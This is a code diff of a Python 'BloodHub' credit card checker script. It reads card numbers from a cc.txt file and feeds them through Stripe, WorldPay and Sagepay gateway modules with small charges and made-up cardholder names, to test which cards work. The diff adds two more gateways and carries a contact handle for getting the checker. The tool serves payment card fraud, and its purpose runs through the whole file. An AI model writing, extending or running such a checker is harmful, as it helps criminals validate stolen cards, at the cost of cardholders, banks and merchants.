@@ -1,47 +1,54 @@
-
 from colorama import Fore, init
-import gateway1, gateway2, time, os
+from bs4 import BeautifulSoup
+from itertools import cycle
+import time
+import requests
+import json
+import threading
+import hashlib
+import random
+import gateway1, gateway2, gateway3, os
 
-
-def CODECHECKER():
+def Main():
     banner = """
-    
-  {y}.--------[ {g}UPDATED BLOODHUB {y}]-------------.
-  {y}|  {r}- 2 Gateways                          {y}|
-  {y}|  {r}- CCN / CVV Checkers                  {y}|
-  {y}'----------------------------------------'
-
-   ----------------------------------------
-             - CHOOSE GATEWAY - 
-   ----------------------------------------
+  {y}-----------------------------------------
+  {y}||--------BloodHub Premium Chk---------||
+  {y}||----------Python Based v3------------||
+  {y}-----------------------------------------
+  {b}-----------------------------------------
+  {y}           - CHOOSE GATEWAY - 
+  {b}-----------------------------------------
+  {g}[1] {r} Gateway 1 CCV/CVV  | Stripe (2$ Charge)
+  {g}[2] {r} Gateway 2 CVV 	| WorldPay (5$ Charge)
+  {g}[3] {r} Gateway 3 CVV 	| Sagepay (5$ Charge)
   
-  {g}[1] {r} Gateway 1 CCN / CVV (Good on Amazon/Ali Banned 5210 and 510)
-  
-  """.format(g=Fore.GREEN, r=Fore.LIGHTRED_EX, y=Fore.YELLOW)
+  """.format(g=Fore.GREEN, b=Fore.GREEN, r=Fore.RED, y=Fore.YELLOW)
     print(banner)
     while True:
         try:
-            codechecker = input(Fore.RESET + 'Select > ')
+            gateway = str(input("Select > "))
         except KeyboardInterrupt:
             print(Fore.RED + '\n[-] ' + Fore.RESET + 'Recieved Exit.')
             exit(1)
 
-        if codechecker == "1":
+        if gateway == "1":
             print()
             print(Fore.YELLOW + "[*] " + Fore.RESET + "Starting Gateway 1...")
             print()
             print("""
-        {re}             {g}_____________{re}
-        {re}------------{g}|- {r}STRIPE GATEWAY 1 -{g}|{re}------------
-        {re}---------------------------------------
-        """.format(g=Fore.GREEN, r=Fore.RED, re=Fore.RESET))
+{re}      {ly}________________________________________________{re}
+{re}     {ly}//----------{y}BloodHub Stripe Gate1{ly}--------------//{re}
+{re}    {ly}//---------------{y}Termux Based v3{ly}---------------//{re}
+{re}   {ly}//-------{r}Contact @BH_Adminn for checker{ly}--------//{re}
+{re}  {ly}================================================ {re}
+""".format(ly=Fore.GREEN, g=Fore.GREEN, y=Fore.YELLOW, r=Fore.RED, re=Fore.RESET))
             ranges = []
             try:
                 with open('cc.txt', 'r') as ccs:
                     for x in ccs.read().split('\n'):
                         ranges.append(x)
                 print(Fore.YELLOW + "[*] " + Fore.RESET + 'Checking ' + str(len(ranges)) + ' Credit Cards.')
-                input(Fore.RESET + "PRESS ANY KEY TO CONTINUE")
+                
                 print(Fore.BLUE + "Start Checking at " + str(time.ctime()))
                 print(Fore.RESET)
                 
@@ -57,7 +64,7 @@ def CODECHECKER():
                 for x in credit_cards.split('\n'):
                     ccEntry += 1
                     try:
-                        gateway1.StripeAutomate(x, ccEntry, 'Jason', "Anderson")
+                        gateway1.StripeAutomate(x, ccEntry, 'Samsoden', "Smith")
                     except KeyboardInterrupt:
                         break
             except KeyboardInterrupt:
@@ -66,5 +73,27 @@ def CODECHECKER():
             print(Fore.GREEN + "[+] " + Fore.RESET + "Done on Gateway 1")
             print()
 
+        elif gateway == "2":
+            print()
+            print(Fore.YELLOW + "[*] " + Fore.RESET + "Starting Gateway 2...")
+            print()
+            try:
+                gateway2.Merchanttwo()
+            except KeyboardInterrupt:
+                pass
+            print()
+            print(Fore.GREEN + "[+] " + Fore.RESET + "Done on Gateway 2")
+            print()
+        elif gateway == "3":
+            print()
+            print(Fore.YELLOW + "[*] " + Fore.RESET + "Starting Gateway 3...")
+            print()
+            try:
+                gateway3.Merchantthree()
+            except KeyboardInterrupt:
+                pass
+            print()
+            print(Fore.GREEN + "[+] " + Fore.RESET + "Done on Gateway 3")
+            print()
 
-CODECHECKER()
+Main()
